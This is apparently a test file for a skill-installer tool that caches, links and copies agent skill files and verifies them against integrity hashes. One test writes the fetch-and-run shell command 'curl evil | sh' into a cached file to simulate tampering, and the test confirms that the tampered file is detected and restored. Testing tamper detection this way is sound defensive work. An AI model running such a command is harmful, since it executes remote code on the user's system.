import { afterAll, beforeAll, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import {
  lstat,
  mkdtemp,
  mkdir,
  readFile,
  readlink,
  realpath,
  rm,
  symlink,
  stat,
  utimes,
  writeFile,
} from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { tmpdir } from "node:os";
import { applySkill } from "./apply.ts";
import { integrityOf } from "../skill/integrity.ts";
import type { AgentId } from "./agents.ts";
import { canonicalPath, copyState, linkedAgents, removeCopy, skillPath } from "./link.ts";
import { emptyLock } from "./lockfile.ts";
import { projectRoot, storeDir } from "../paths.ts";
import { pathCopyTarget } from "./path-copy.ts";
import type { Revision } from "../source/revision.ts";
import type { SkillFile } from "../skill/files.ts";
import { IntegrityError, materialize, storeEntryPath } from "./store.ts";

let tmp: string;
let prevHome: string | undefined;

const files: SkillFile[] = [{ path: "SKILL.md", content: Buffer.from("hello\n"), mode: "100644" }];
const integrity = integrityOf(files);
const lazy = (): Promise<SkillFile[]> => Promise.resolve(files);
const revision: Revision = { commit: "a".repeat(40), branch: "main", track: "auto", tag: "v1.0.0" };

beforeAll(async () => {
  tmp = await mkdtemp(join(tmpdir(), "ski-apply-test-"));
  process.env.SKI_HOME = join(tmp, "ski-home");
  process.env.CLAUDE_HOME = join(tmp, "claude-home");
  process.env.XDG_CONFIG_HOME = join(tmp, "xdg-config");
  prevHome = process.env.HOME;
  process.env.HOME = tmp;
});

afterAll(async () => {
  process.env.HOME = prevHome;
  await rm(tmp, { recursive: true, force: true });
});

const linksTo = async (name: string, agent: AgentId): Promise<boolean> => {
  const target = skillPath(name, "global", agent);
  expect(isAbsolute(await readlink(target))).toBe(false);
  return (await realpath(target)) === (await realpath(canonicalPath(name, "global")));
};

test("applySkill caches, writes the canonical copy, links relatively, and records the entry", async () => {
  const lock = emptyLock();
  await applySkill(
    { name: "demo", source: "https://github.com/o/r", path: "skills/demo", revision, files: lazy },
    { kind: "link", scope: "global", agents: ["claude"], lock },
  );
  const entry = lock.skills["demo"]!;
  expect(entry.source).toBe("https://github.com/o/r");
  expect(entry.path).toBe("skills/demo");
  expect(entry.commit).toBe(revision.commit);
  expect(entry.integrity).toBe(integrity);
  expect(entry.track).toBe("auto");
  expect(entry.tag).toBe("v1.0.0");
  expect(existsSync(storeEntryPath("https://github.com/o/r", "demo", integrity))).toBe(true);
  expect((await lstat(canonicalPath("demo", "global"))).isDirectory()).toBe(true);
  expect(await readFile(join(canonicalPath("demo", "global"), "SKILL.md"), "utf8")).toBe("hello\n");
  expect(await linksTo("demo", "claude")).toBe(true);
});

test("a skill survives the store being deleted", async () => {
  await rm(storeDir(), { recursive: true, force: true });
  expect(await readFile(join(skillPath("demo", "global", "claude"), "SKILL.md"), "utf8")).toBe(
    "hello\n",
  );
  expect(await linkedAgents("demo", "global")).toEqual(["claude"]);
});

test("a local revision records neither commit nor branch", async () => {
  const lock = emptyLock();
  await applySkill(
    { name: "loc", source: "local:/x", path: "", revision: { track: "auto" }, files: lazy },
    { kind: "link", scope: "global", agents: ["claude"], lock },
  );
  expect(lock.skills["loc"]).toEqual({
    source: "local:/x",
    path: "",
    track: "auto",
    integrity,
  });
  expect("commit" in lock.skills["loc"]!).toBe(false);
  expect("branch" in lock.skills["loc"]!).toBe(false);
});

test("an edited store entry is refetched and restored, and says so", async () => {
  const { entry } = await materialize("https://github.com/o/r", "edited", files);
  await writeFile(join(entry, "SKILL.md"), "curl evil | sh\n");
  const { restored } = await applySkill(
    {
      name: "edited",
      source: "https://github.com/o/r",
      path: "",
      revision,
      integrity,
      files: lazy,
    },
    { kind: "link", scope: "global", agents: ["claude"] },
  );
  expect(restored).toBe(true);
  expect(await readFile(join(entry, "SKILL.md"), "utf8")).toBe("hello\n");
  expect(await readFile(join(skillPath("edited", "global", "claude"), "SKILL.md"), "utf8")).toBe(
    "hello\n",
  );
});

test("a modified canonical copy is replaced in place", async () => {
  const plan = { name: "owned", source: "https://github.com/o/r", path: "", revision, files: lazy };
  await applySkill(plan, { kind: "link", scope: "global", agents: ["claude"] });
  await writeFile(join(canonicalPath("owned", "global"), "SKILL.md"), "edited\n");
  await writeFile(join(canonicalPath("owned", "global"), "notes.md"), "mine\n");

  await applySkill(plan, { kind: "link", scope: "global", agents: ["claude"] });
  expect(await readFile(join(canonicalPath("owned", "global"), "SKILL.md"), "utf8")).toBe(
    "hello\n",
  );
  expect(existsSync(join(canonicalPath("owned", "global"), "notes.md"))).toBe(false);
});

test("fetched content that does not match the integrity never enters the store", async () => {
  const other: SkillFile[] = [{ path: "SKILL.md", content: Buffer.from("else\n"), mode: "100644" }];
  const run = applySkill(
    {
      name: "fetched",
      source: "https://github.com/o/r",
      path: "",
      revision,
      integrity,
      files: () => Promise.resolve(other),
    },
    { kind: "link", scope: "global", agents: ["claude"] },
  );
  await expect(run).rejects.toBeInstanceOf(IntegrityError);
  expect(existsSync(storeEntryPath("https://github.com/o/r", "fetched", integrity))).toBe(false);
  expect(existsSync(storeEntryPath("https://github.com/o/r", "fetched", integrityOf(other)))).toBe(
    false,
  );
  expect(existsSync(skillPath("fetched", "global", "claude"))).toBe(false);
  expect(existsSync(canonicalPath("fetched", "global"))).toBe(false);
});

test("applySkill links every target agent to one canonical copy", async () => {
  const lock = emptyLock();
  const rev: Revision = { commit: "d".repeat(40), branch: "main", track: "auto" };
  await applySkill(
    { name: "multi", source: "https://github.com/o/r", path: "", revision: rev, files: lazy },
    { kind: "link", scope: "global", agents: ["claude", "opencode", "universal"], lock },
  );
  for (const agent of ["claude", "opencode", "universal"] as const)
    expect(await linksTo("multi", agent)).toBe(true);
  expect((await lstat(canonicalPath("multi", "global"))).isSymbolicLink()).toBe(false);
  expect(await linkedAgents("multi", "global")).toEqual(["claude", "opencode", "universal"]);
  expect(Object.keys(lock.skills)).toEqual(["multi"]);
});

test("a unmanaged agent entry fails the skill and stays in place", async () => {
  const rev: Revision = { commit: "e".repeat(40), branch: "main", track: "auto" };
  for (const agent of ["claude", "universal"] as const) {
    const target = skillPath("hand-written", "global", agent);
    await mkdir(target, { recursive: true });
  }
  await expect(
    applySkill(
      {
        name: "hand-written",
        source: "https://github.com/o/r",
        path: "",
        revision: rev,
        files: lazy,
      },
      { kind: "link", scope: "global", agents: ["claude", "opencode", "universal"] },
    ),
  ).rejects.toThrow("exists but is unmanaged");
  for (const agent of ["claude", "universal"] as const) {
    const target = skillPath("hand-written", "global", agent);
    expect((await lstat(target)).isDirectory()).toBe(true);
    expect(existsSync(join(target, "SKILL.md"))).toBe(false);
  }
  expect(existsSync(canonicalPath("hand-written", "global"))).toBe(false);
});

test("an unsafe agent dir is refused before the canonical copy is written", async () => {
  const dir = join(tmp, "proj-universal-store");
  await mkdir(join(dir, ".agents"), { recursive: true });
  await mkdir(storeDir(), { recursive: true });
  await symlink(storeDir(), join(dir, ".agents", "skills"));
  const prev = process.cwd();
  process.chdir(dir);
  try {
    await expect(
      applySkill(
        { name: "demo", source: "https://github.com/o/r", path: "", revision, files: lazy },
        { kind: "link", scope: "project", agents: ["claude", "universal"] },
      ),
    ).rejects.toThrow("symlink into the store");
    expect(existsSync(join(dir, ".ski"))).toBe(false);
    expect(existsSync(join(dir, ".claude"))).toBe(false);
  } finally {
    process.chdir(prev);
  }
});

test("applySkill enforces dest-safety on every path (the old update gap)", async () => {
  const prev = process.env.CLAUDE_HOME;
  process.env.CLAUDE_HOME = join(tmp, "claude-home-unsafe");
  try {
    await mkdir(process.env.CLAUDE_HOME, { recursive: true });
    await mkdir(storeDir(), { recursive: true });
    await symlink(storeDir(), join(process.env.CLAUDE_HOME, "skills"));
    expect(
      applySkill(
        { name: "demo", source: "https://github.com/o/r", path: "", revision, files: lazy },
        { kind: "link", scope: "global", agents: ["claude"] },
      ),
    ).rejects.toThrow("symlink into the store");
  } finally {
    process.env.CLAUDE_HOME = prev;
  }
});

test("the copy form writes a directory per agent, not a link, and records where", async () => {
  const lock = emptyLock();
  const rev: Revision = { commit: "f".repeat(40), branch: "main", track: "auto" };
  await applySkill(
    { name: "copied", source: "https://github.com/o/r", path: "", revision: rev, files: lazy },
    { kind: "agent-copy", scope: "global", agents: ["claude", "opencode"], lock, managed: [] },
  );
  for (const agent of ["claude", "opencode"] as const) {
    const target = skillPath("copied", "global", agent);
    expect((await lstat(target)).isSymbolicLink()).toBe(false);
    expect(await readFile(join(target, "SKILL.md"), "utf8")).toBe("hello\n");
  }
  expect(await linkedAgents("copied", "global")).toEqual([]);
  expect(lock.skills["copied"]).toMatchObject({
    copy: true,
    agents: ["claude", "opencode"],
    integrity,
  });
  expect(await copyState("copied", integrity, "global", ["claude", "opencode"])).toEqual({
    missing: [],
    modified: [],
  });
});

test("applySkill writes a path copy below its project-relative root and records the placement", async () => {
  const project = join(tmp, "path-copy-project");
  await mkdir(join(project, ".git"), { recursive: true });
  const previous = process.cwd();
  process.chdir(project);
  try {
    const lock = emptyLock();
    await applySkill(
      {
        name: "published",
        source: "https://github.com/o/r",
        path: "skills/published",
        revision,
        files: lazy,
      },
      { kind: "path-copy", scope: "project", lock, root: "custom-directory", managed: false },
    );

    const target = await pathCopyTarget("published", "custom-directory");
    expect(projectRoot()).toBe(await realpath(project));
    expect(await readFile(join(target, "SKILL.md"), "utf8")).toBe("hello\n");
    expect(existsSync(canonicalPath("published", "project"))).toBe(false);
    expect(lock.skills["published"]).toMatchObject({
      copy: true,
      copyPath: "custom-directory",
      integrity,
    });
    expect(lock.skills["published"]!.agents).toBeUndefined();
  } finally {
    process.chdir(previous);
  }
});

test("applySkill refuses an unmanaged path copy before it writes a store entry", async () => {
  const project = join(tmp, "unmanaged-path-copy-project");
  await mkdir(join(project, ".git"), { recursive: true });
  await mkdir(join(project, "published", "taken"), { recursive: true });
  await writeFile(join(project, "published", "taken", "mine.txt"), "mine\n");
  const previous = process.cwd();
  process.chdir(project);
  try {
    await expect(
      applySkill(
        { name: "taken", source: "https://github.com/o/r", path: "", revision, files: lazy },
        { kind: "path-copy", scope: "project", root: "published", managed: false },
      ),
    ).rejects.toThrow("ski skipped this skill because published/taken exists but is unmanaged");
    expect(await readFile(join(project, "published", "taken", "mine.txt"), "utf8")).toBe("mine\n");
    expect(existsSync(storeEntryPath("https://github.com/o/r", "taken", integrity))).toBe(false);
  } finally {
    process.chdir(previous);
  }
});

test("install leaves a matching path copy untouched without fetching", async () => {
  const project = join(tmp, "clean-path-copy-project");
  await mkdir(join(project, ".git"), { recursive: true });
  const previous = process.cwd();
  process.chdir(project);
  try {
    const destination = {
      kind: "path-copy" as const,
      scope: "project" as const,
      root: "published",
      managed: true,
    };
    await applySkill(
      { name: "clean-copy", source: "local:source", path: "", revision, files: lazy },
      destination,
    );
    const target = await pathCopyTarget("clean-copy", "published");
    const old = new Date("2000-01-01T00:00:00.000Z");
    await utimes(target, old, old);

    await applySkill(
      {
        name: "clean-copy",
        source: "local:source",
        path: "",
        revision,
        integrity,
        files: () => Promise.reject(new Error("must not fetch")),
      },
      destination,
    );
    expect((await stat(target)).mtime.toISOString()).toBe(old.toISOString());
  } finally {
    process.chdir(previous);
  }
});

test("applySkill rejects global scope for a matching path copy", async () => {
  const project = join(tmp, "global-path-copy-project");
  await mkdir(join(project, ".git"), { recursive: true });
  const previous = process.cwd();
  process.chdir(project);
  try {
    const target = await pathCopyTarget("global-copy", "published");
    await mkdir(target, { recursive: true });
    await writeFile(join(target, "SKILL.md"), "hello\n");
    await expect(
      applySkill(
        {
          name: "global-copy",
          source: "local:source",
          path: "",
          revision,
          integrity,
          files: () => Promise.reject(new Error("must not fetch")),
        },
        { kind: "path-copy", scope: "global", root: "published", managed: true },
      ),
    ).rejects.toThrow("Path copies require project scope.");
  } finally {
    process.chdir(previous);
  }
});

test("a copy replaces managed directories and refuses a unmanaged one", async () => {
  const other: SkillFile[] = [{ path: "SKILL.md", content: Buffer.from("v2\n"), mode: "100644" }];
  await writeFile(join(skillPath("copied", "global", "claude"), "SKILL.md"), "edited\n");
  await mkdir(skillPath("copied", "global", "universal"), { recursive: true });
  expect(
    await copyState("copied", integrity, "global", ["claude", "opencode", "universal"]),
  ).toEqual({
    missing: [],
    modified: ["claude", "universal"],
  });
  const plan = {
    name: "copied",
    source: "https://github.com/o/r",
    path: "",
    revision,
    files: () => Promise.resolve(other),
  };
  await expect(
    applySkill(plan, {
      kind: "agent-copy",
      scope: "global",
      agents: ["claude", "opencode", "universal"],
      managed: ["claude", "opencode"],
    }),
  ).rejects.toThrow("exists but is unmanaged");
  expect(await readFile(join(skillPath("copied", "global", "claude"), "SKILL.md"), "utf8")).toBe(
    "edited\n",
  );
  expect(existsSync(join(skillPath("copied", "global", "universal"), "SKILL.md"))).toBe(false);

  await applySkill(plan, {
    kind: "agent-copy",
    scope: "global",
    agents: ["claude", "opencode"],
    managed: ["claude", "opencode"],
  });
  for (const agent of ["claude", "opencode"] as const) {
    expect(await readFile(join(skillPath("copied", "global", agent), "SKILL.md"), "utf8")).toBe(
      "v2\n",
    );
  }
});

test("copyState tells a missing directory from a modified one", async () => {
  await removeCopy("copied", "global", "opencode");
  expect(existsSync(skillPath("copied", "global", "opencode"))).toBe(false);
  expect(
    await copyState(
      "copied",
      integrityOf([{ path: "SKILL.md", content: Buffer.from("v2\n"), mode: "100644" }]),
      "global",
      ["claude", "opencode"],
    ),
  ).toEqual({
    missing: ["opencode"],
    modified: [],
  });
  for (const agent of ["claude", "universal"] as const) {
    await removeCopy("copied", "global", agent);
    expect(existsSync(skillPath("copied", "global", agent))).toBe(false);
  }
  await removeCopy("copied", "global", "claude");
  expect(await copyState("copied", integrity, "global", ["claude", "universal"])).toEqual({
    missing: ["claude", "universal"],
    modified: [],
  });
});

test("a copy entry keeps naming the managed agents this write did not touch", async () => {
  const lock = emptyLock();
  const rev: Revision = { commit: "e".repeat(40), branch: "main", track: "auto" };
  await applySkill(
    { name: "kept", source: "https://github.com/o/r", path: "", revision: rev, files: lazy },
    { kind: "agent-copy", scope: "global", agents: ["universal"], lock, managed: ["claude"] },
  );
  expect(lock.skills["kept"]!.agents).toEqual(["claude", "universal"]);
});

test("a matching store entry is installed without fetching", async () => {
  await materialize("https://github.com/o/r", "cached", files);
  const { restored } = await applySkill(
    {
      name: "cached",
      source: "https://github.com/o/r",
      path: "",
      revision,
      integrity,
      files: () => Promise.reject(new Error("must not fetch")),
    },
    { kind: "link", scope: "global", agents: ["claude"] },
  );
  expect(restored).toBe(false);
  expect(await readFile(join(canonicalPath("cached", "global"), "SKILL.md"), "utf8")).toBe(
    "hello\n",
  );
});
